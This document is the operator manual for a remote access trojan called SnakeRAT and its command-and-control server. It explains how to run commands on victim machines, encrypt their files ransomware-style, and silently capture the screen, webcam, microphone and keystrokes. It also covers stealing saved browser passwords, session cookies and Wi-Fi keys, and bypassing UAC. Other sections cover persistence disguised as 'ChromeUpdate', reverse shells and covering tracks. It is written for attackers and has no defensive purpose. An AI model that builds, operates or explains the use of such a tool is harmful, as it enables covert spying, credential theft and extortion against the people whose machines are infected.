# SnakeRAT Advanced C2 Server Command Reference

This document provides highly detailed explanations of every command available in the Advanced RAT C2 interface. 

## Management & Navigation
These commands govern how you interact with the C2 environment and manage connected hosts.

* **[clients](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#515-519)**
  * **Description**: Lists all currently connected clients in a tabular format. Displays Client ID, IP Address, Hostname, Operating System, and the time they were last seen active by the heartbeat tracker.

* **`select <client_id>`**
  * **Description**: Sets the active target session. All subsequent single-target commands (like [shell](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#561-575), [screenshot](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#660-668), etc.) will be automatically directed to this client.
  * **Example**: `select 825f39637fbd28bd`

* **`deselect`**
  * **Description**: Exits single-target mode and returns to `C2@all >` mode. Broadcast commands can be run here.

* **`clear`**
  * **Description**: Clears the terminal screen of old output.

* **[help](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#455-514)** or **`?`**
  * **Description**: Prints out a quick-reference cheat sheet directly in the terminal for all commands.

* **[exit](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#976-982)** or **`quit`**
  * **Description**: Safely shuts down the C2 server, closing all sockets and terminating background threads.

## Remote Execution
These commands allow raw execution of code on the victim system.

* **`shell <command>`**
  * **Description**: Drops you into a reverse-shell-like experience.
  * **Usage**: If you type [shell](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#561-575) without arguments, you enter a persistent interactive shell mode `SHELL@<id> >`. Any command typed here natively executes through `cmd.exe` (Windows) or `/bin/sh` (Linux/Mac). Type [exit](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#976-982) to return to C2 mode. If you provide a command (`shell whoami`), it runs it as a single-shot command.
  * **Note**: Supports internal state. E.g., `shell cd C:\Users` will correctly change the directory for all future shell commands.

* **`ps <command>`** or **`powershell <command>`**
  * **Description**: Natively runs a script via PowerShell on the victim without spawning a visible window. 
  * **Example**: `ps Get-Process`

* **`script <local_file>`**
  * **Description**: Reads a Python script from your local attacker machine and executes it completely in-memory on the victim client. Leaves zero trace on the disk.

## File Operations
Interact with the target host's filesystem.

* **`download <remote_path>`**
  * **Description**: Pulls a specified file from the client and saves it directly into the `loot/file/` folder on the C2 server.

* **`upload <local_path> [remote_path]`**
  * **Description**: Uploads a file from the server to the client. If `[remote_path]` is omitted, it drops the file into the client's current working directory.

* **`write <remote_path> <content>`**
  * **Description**: Instantly creates or overwrites a text file on the remote machine without needing to upload a physical file.
  * **Example**: `write C:\Windows\Temp\note.txt "You have been hacked"`

* **`browse [remote_path]`**
  * **Description**: Lists the contents of a directory. Shows file sizes, modification times, permissions, and visual distinction between folders and files. Defaults to current directory if no path is given.

* **`crypt <remote_path> <encrypt/decrypt>`**
  * **Description**: A ransomware-style feature. Locks (encrypts) or unlocks (decrypts) a specific file or folder using military-grade Fernet encryption. 

## Surveillance & Monitoring
Spy on the environment and the user of the target machine.

* **[screenshot](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#660-668)**
  * **Description**: Uses a waterfall-fallback mechanism (mss -> ImageGrab -> OS native tools) to silently capture the primary monitor and send it to your [loot/](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#540-547) folder.

* **[webcam](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#669-677)**
  * **Description**: Silently captures a single still frame from the primary connected webcam using OpenCV (cv2) and sends the JPEG to your [loot/](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#540-547).

* **`mic [duration_in_seconds]`**
  * **Description**: Silently records audio from the default microphone and transmits it back as a `.wav` file.
  * **Example**: `mic 15`

* **`stream start [fps]` / `stream stop`**
  * **Description**: Initiates a high-speed, live, compressed video feed of the target's screen. The video pops up native GUI window on the C2 server. Press 'q' on the video window to stop it.

* **`keylog [dump / <seconds> / clear]`**
  * **Description**: Manages the stealth background keylogger. 
  * `keylog dump`: Grabs the current keystroke buffer and sends it to your C2 server. If it's massive, it writes to a file in [loot/](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#540-547), otherwise prints it to screen.
  * `keylog 30`: Sleeps for 30 seconds to gather live keys, and then automatically returns the dump.
  * `keylog clear`: Wipes out the current keystrokes from memory.

* **`clip [get/set] [text]`**
  * **Description**: Hijacks the system clipboard.
  * `clip get`: Pulls whatever text the user currently has copied.
  * `clip set "Hello"`: Forcefully changes their clipboard contents.

## Credential & Data Theft
Extract highly sensitive data to elevate access on target accounts.

* **[passwords](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#848-856)**
  * **Description**: Uses DPAPI bypass to steal and decrypt saved passwords from Chrome, Edge, Brave, Opera, and Opera GX. Automatically bundles everything into a structured JSON file.

* **`cookies [url_filter] [live]`**
  * **Description**: Steals browser session cookies. Optionally pass a URL (like `instagram.com`) to filter results. 
  * If [live](file:///d:/projects/project-Decoy/deepseek/d.py#155-455) is appended, it briefly fires up an invisible CDP (Chrome Dev Protocol) session to harvest un-decryptable "App-Bound" session tokens dynamically.

* **[chromelevator](file:///d:/projects/project-Decoy/deepseek/d.py#2038-2102)**
  * **Description**: An advanced method using a payload injector (`chromelevator_x64.exe`) to scrape browser data if standard DPAPI hooks fail due to AV.

* **[wifi](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#840-847)**
  * **Description**: Scrapes all stored WLAN profiles on the victim machine and runs extraction scripts to pull the plain-text passwords for every Wi-Fi network they have ever connected to.

## Network & System Hacking
Interact with internal networks and services.

* **`scan <ip> <start_port-end_port>`**
  * **Description**: Performs a stealthy internal port scan originating *from* the zombie machine against internal IPs that you normally wouldn't be able to reach from the external internet.

* **`socks <port>`**
  * **Description**: Starts a live SOCKS4 proxy on the victim. 

* **`revshell <ip> <port>`**
  * **Description**: Spawns a raw reverse TCP shell back to a listener of your choosing (like Metasploit or Netcat) while evading typical AV heuristics.

* **`process [list/kill] [pid]`**
  * **Description**: Allows you to view a list of all running tasks on the system or mercilessly `kill` a process ID (requires appropriate privileges).

## System Operations
Manage persistence, privileges, and cleanups.

* **[persist](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#736-744)**
  * **Description**: Injects the RAT into multiple startup locations. On Windows, it masks itself as "ChromeUpdate" and installs via the Registry, Scheduled Tasks, and User Startup folder simultaneously while dropping a hidden shadow VBS executable.

* **[unpersist](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/d_backup.py#2276-2280)**
  * **Description**: Automatically hunts down and scrubs out every persistence artifact created by the [persist](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#736-744) command.

* **[elevate](file:///d:/projects/project-Decoy/deepseek/d.py#1469-1510)**
  * **Description**: Attempts an automated UAC Bypass to escalate from a standard user to `NT AUTHORITY\SYSTEM` or Administrator. Spawns an elevated duplicate process.

* **[unelevate](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#698-707)**
  * **Description**: Drops privileges back to a normal user profile if elevated operations are complete.

* **`abort [task_id]`**
  * **Description**: If a command is stuck or hanging long execution logic, passing [abort](file:///d:/projects/project-Decoy%20%282%29/project-Decoy/deepseek/s_backup.py#708-718) will force-kill the thread immediately.

* **[clean](file:///d:/projects/project-Decoy/deepseek/d.py#2519-2523)**
  * **Description**: Covers your tracks. Deletes PowerShell history (`ConsoleHost_history.txt`), bash history, Python history, and scrub traces out of recent document logs.

* **`destroy`**
  * **Description**: The ultimate kill switch. Removes persistence, cleans tracks, terminates the connection, and then commands the client executable to delete itself permanently from the victim's disk.

## Trolls & Annoyances
Visible effects to show control over the target system.

* **`url <website_url>`**
  * **Description**: Forces the remote computer to instantly open their default web browser and navigate to the specified URL.

* **`msg <text>`**
  * **Description**: Triggers a native OS message box popup right in the center of the screen with your customized text.

* **`wallpaper <local_path_on_victim>`**
  * **Description**: Instantly changes their desktop background graphic to an image of your choosing.

* **`power <lock/logout/shutdown/reboot>`**
  * **Description**: Takes control of kernel power states. Locks the workstation, logs out the active user, forces a hard reboot, or powers the machine entirely off.
